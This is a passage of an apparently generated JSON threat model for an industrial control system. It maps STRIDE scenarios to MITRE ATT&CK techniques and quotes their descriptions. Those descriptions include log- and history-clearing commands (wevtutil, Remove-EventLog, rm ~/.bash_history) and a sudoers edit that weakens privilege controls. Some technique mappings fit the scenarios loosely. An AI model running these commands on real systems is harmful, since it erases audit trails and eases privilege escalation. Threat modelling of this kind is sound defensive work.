Boden gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed by Hunter Watertech for its use in changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. (Citation: Maroochy - MITRE - 200808)",
                "id": "attack-pattern--e0d74479-86d2-465d-bf36-903ebecef43e",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infects the MES database, corrupting production workflow data.",
            "Assumptions": [
                {
                    "Assumption": "The MES database is accessible from networks that could be compromised.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate network segregation"
                },
                {
                    "Assumption": "Malware detection and prevention controls are insufficient.",
                    "Role": "Security Team",
                    "Condition": "Inadequate endpoint protection and detection systems"
                },
                {
                    "Assumption": "Database backups are not retained or regularly validated.",
                    "Role": "Database Administrator",
                    "Condition": "Lack of regular backup processes or integrity checks"
                }
            ],
            "Potential Impact": "Corrupted workflow data can lead to production stoppages, errors in manufacturing processes, and significant financial loss.",
            "MITRE ATT&CK Keywords": [
                "Database",
                "Tampering",
                "MES",
                "Malware",
                "Production Workflow"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets between field devices and RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Data packets are transmitted over unencrypted channels.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption or weak encryption protocols"
                },
                {
                    "Assumption": "There is no integrity check on the payloads being transmitted.",
                    "Role": "System Architect",
                    "Condition": "Lack of data integrity validation mechanisms"
                },
                {
                    "Assumption": "Field devices do not verify the authenticity of the received commands.",
                    "Role": "Device Manufacturer",
                    "Condition": "Devices lack authentication mechanisms"
                }
            ],
            "Potential Impact": "Modification of data packets can cause field devices to perform unintended actions, potentially leading to industrial process failures and safety hazards.",
            "MITRE ATT&CK Keywords": [
                "Interception",
                "Tampering",
                "Field Devices",
                "RTUs",
                "Data Packets"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending certain control commands through the HMI interface.",
            "Assumptions": [
                {
                    "Assumption": "HMI interface logs are not adequately detailed or audited.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging or monitoring"
                },
                {
                    "Assumption": "User actions through the HMI are not securely recorded with non-repudiation mechanisms.",
                    "Role": "Software Engineer",
                    "Condition": "Lack of digital signatures or similar verification methods"
                },
                {
                    "Assumption": "Multiple users share the same authentication credentials.",
                    "Role": "Users",
                    "Condition": "Shared or generic credentials in use"
                }
            ],
            "Potential Impact": "Unverifiable command history can make incident investigation and accountability difficult, hindering the ability to address unauthorized actions and compliance issues.",
            "MITRE ATT&CK Keywords": [
                "HMI",
                "Repudiation",
                "Control Commands",
                "Logging",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator denies making configuration changes on RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or logs are easily alterable.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate or insecure logging mechanisms"
                },
                {
                    "Assumption": "Access controls do not uniquely identify the operator making the changes.",
                    "Role": "Access Control Manager",
                    "Condition": "Lack of unique user credentials"
                },
                {
                    "Assumption": "Tamper-evident mechanisms are not in place for configuration changes.",
                    "Role": "System Architect",
                    "Condition": "System does not have mechanisms to detect or flag changes"
                }
            ],
            "Potential Impact": "Difficulty in tracking, verifying, and reversing unauthorized or erroneous changes, leading to prolonged system outages or operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "RTUs",
                "Repudiation",
                "Configuration Changes",
                "Logging",
                "Access Controls"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies uploading files to the cloud storage with malicious intent.",
            "Assumptions": [
                {
                    "Assumption": "Cloud upload activities are not tightly monitored or flagged.",
                    "Role": "Cloud Administrator",
                    "Condition": "Lack of effective monitoring and alerting systems"
                },
                {
                    "Assumption": "Users' actions within the cloud storage are not properly audited.",
                    "Role": "Security Team",
                    "Condition": "Insufficient audit trails for user activities"
                },
                {
                    "Assumption": "Files are not scanned for malware before being uploaded.",
                    "Role": "System Administrator",
                    "Condition": "Absence of file scanning and malware detection"
                }
            ],
            "Potential Impact": "Malicious files in cloud storage can compromise other systems, leading to data breaches, operational disruption, and potential legal consequences.",
            "MITRE ATT&CK Keywords": [
                "Cloud Storage",
                "Repudiation",
                "File Upload",
                "Malicious Intent",
                "Monitoring"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmitted from sensors to the SCADA system.",
            "Assumptions": [
                {
                    "Assumption": "Data from sensors are transmitted over unencrypted channels.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption or weak encryption protocols"
                },
                {
                    "Assumption": "No secure tunneling or VPN is used for data transmission.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of secure transmission mechanisms"
                },
                {
                    "Assumption": "Sensors do not verify the authenticity of the receiving units.",
                    "Role": "Device Manufacturer",
                    "Condition": "Devices lack mutual authentication mechanisms"
                }
            ],
            "Potential Impact": "Disclosure of sensitive operational data can provide attackers with insights into system operations, leading to targeted attacks and industrial espionage.",
            "MITRE ATT&CK Keywords": [
                "Sensors",
                "Information Disclosure",
                "Unencrypted Data",
                "Interception",
                "SCADA"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in the cloud is accessed by unauthorized users due to misconfigured access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls for cloud storage are misconfigured or too permissive.",
                    "Role": "Cloud Administrator",
                    "Condition": "Incorrectly configured access permissions"
                },
                {
                    "Assumption": "Cloud storage does not have multi-factor authentication (MFA) enabled.",
                    "Role": "System Architect",
                    "Condition": "Absence of MFA for cloud access"
                },
                {
                    "Assumption": "Sensitive data in the cloud is not adequately encrypted.",
                    "Role": "Data Custodian",
                    "Condition": "Lack of encryption for sensitive data"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data leads to data breaches, competitive disadvantage, and potential regulatory penalties.",
            "MITRE ATT&CK Keywords": [
                "Cloud Storage",
                "Information Disclosure",
                "Access Controls",
                "Sensitive Data",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Employee falls victim to phishing attack, exposing access credentials to an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Employees are susceptible to phishing attacks due to lack of training.",
                    "Role": "Employee",
                    "Condition": "Inadequate cybersecurity training and awareness"
                },
                {
                    "Assumption": "IT systems do not enforce regular password changes or use multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "Absence of MFA and password policies"
                },
                {
                    "Assumption": "Emails do not go through a robust anti-phishing filter.",
                    "Role": "Email Administrator",
                    "Condition": "Lack of effective email protections"
                }
            ],
            "Potential Impact": "Compromised credentials grant attackers unauthorized access to sensitive systems, resulting in data breaches and loss of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Information Disclosure",
                "Access Credentials",
                "Sensitive Data",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targets the Control Center's WAN connection, disrupting communication with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "WAN connection has insufficient bandwidth to handle high traffic volume.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of adequate bandwidth or DDoS protection measures"
                },
                {
                    "Assumption": "No redundancy or failover mechanisms are in place for WAN links.",
                    "Role": "System Designer",
                    "Condition": "Absence of redundancy"
                },
                {
                    "Assumption": "Network monitoring and traffic analysis tools are not capable of identifying and mitigating DDoS attacks.",
                    "Role": "Security Engineer",
                    "Condition": "Insufficient network defenses"
                }
            ],
            "Potential Impact": "Loss of control and monitoring capabilities, leading to potential safety issues and operational downtime.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Denial of Service",
                "WAN",
                "Control Center",
                "RTUs"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects field devices, causing them to repeatedly crash and restart.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are not equipped with robust anti-malware protections.",
                    "Role": "Device Manufacturer",
                    "Condition": "Lack of endpoint protection"
                },
                {
                    "Assumption": "There is no isolation between infected and non-infected devices.",
                    "Role": "System Administrator",
                    "Condition": "Lack of network segregation"
                },
                {
                    "Assumption": "Malware detection and incident response procedures are inadequate.",
                    "Role": "Security Team",
                    "Condition": "Inadequate detection and response capabilities"
                }
            ],
            "Potential Impact": "Repeated crashes can disrupt industrial processes, leading to operational downtime and potential damage to equipment.",
            "MITRE ATT&CK Keywords": [
                "Field Devices",
                "Denial of Service",
                "Malware",
                "Crashes",
                "Operational Disruption"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a network-based DoS attack against the communication gateway, halting data exchanges between SCADA systems and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Gateway lacks sufficient network traffic filtering and rate limiting.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate traffic management controls"
                },
                {
                    "Assumption": "There is no redundant gateway to take over in case of failure.",
                    "Role": "System Designer",
                    "Condition": "Absence of redundancy mechanisms"
                },
                {
                    "Assumption": "The system does not employ effective network intrusion detection and prevention systems.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of network security measures"
                }
            ],
            "Potential Impact": "Operational data flow is halted, leading to a loss of monitoring and control capabilities in industrial processes.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "Denial of Service",
                "Gateway",
                "Network Attack",
                "SCADA"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the HMI software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "HMI software contains exploitable vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Unpatched or poorly designed software"
                },
                {
                    "Assumption": "User privileges are not adequately segregated within the HMI.",
                    "Role": "System Administrator",
                    "Condition": "Lack of role-based access control"
                },
                {
                    "Assumption": "The system does not employ robust logging and monitoring to detect privilege escalation.",
                    "Role": "Security Team",
                    "Condition": "Inadequate monitoring capabilities"
                }
            ],
            "Potential Impact": "Attackers can perform unauthorized actions, affecting system configuration and potentially causing operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "HMI",
                "Elevation of Privilege",
                "Vulnerability",
                "Software Exploit",
                "Administrative Privileges"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A disgruntled employee uses their legitimate access to elevate privileges and access sensitive MES data beyond their role.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are not strictly enforced with principle of least privilege.",
                    "Role": "Access Control Manager",
                    "Condition": "Weak access control policies"
                },
                {
                    "Assumption": "Logs and monitoring do not adequately track user privilege changes.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging and tracking"
                },
                {
                    "Assumption": "Users are not regularly reviewed for their access and privileges.",
                    "Role": "HR and IT",
                    "Condition": "Lack of regular access reviews"
                }
            ],
            "Potential Impact": "Unauthorized access and potential manipulation of critical MES data, leading to production errors and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Insider Threat",
                "Access Control",
                "MES",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a backend API vulnerability to gain elevated access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Backend APIs are accessible over the internet and contain vulnerabilities.",
                    "Role": "API Developer",
                    "Condition": "Exposure of vulnerable API endpoints"
                },
                {
                    "Assumption": "There are no effective rate limiting and anomaly detection mechanisms in place for API requests.",
                    "Role": "Security Engineer",
                    "Condition": "Ineffective or absent defensive measures"
                },
                {
                    "Assumption": "API endpoint lacks proper authentication and authorization mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Lack of secure authentication/authorization"
                }
            ],
            "Potential Impact": "Attackers can manipulate or delete sensitive data stored in the cloud, leading to significant operational and financial damage.",
            "MITRE ATT&CK Keywords": [
                "API",
                "Elevation of Privilege",
                "Vulnerability",
                "Cloud Services",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
